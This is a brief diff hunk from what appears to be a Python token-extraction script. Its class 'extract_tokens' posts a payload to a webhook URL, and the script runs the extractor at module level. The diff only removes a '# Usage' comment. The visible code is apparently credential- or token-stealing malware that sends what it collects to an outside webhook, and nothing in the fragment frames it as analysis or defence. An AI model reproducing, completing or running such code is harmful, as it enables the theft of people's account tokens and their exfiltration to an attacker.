@@ -396,7 +396,7 @@ class extract_tokens:
                 response = requests.post(webhook_url, json=payload)
 
 
-# Usage
+
 extractor = extract_tokens()
 extractor.print_tokens(webhook_url)
 
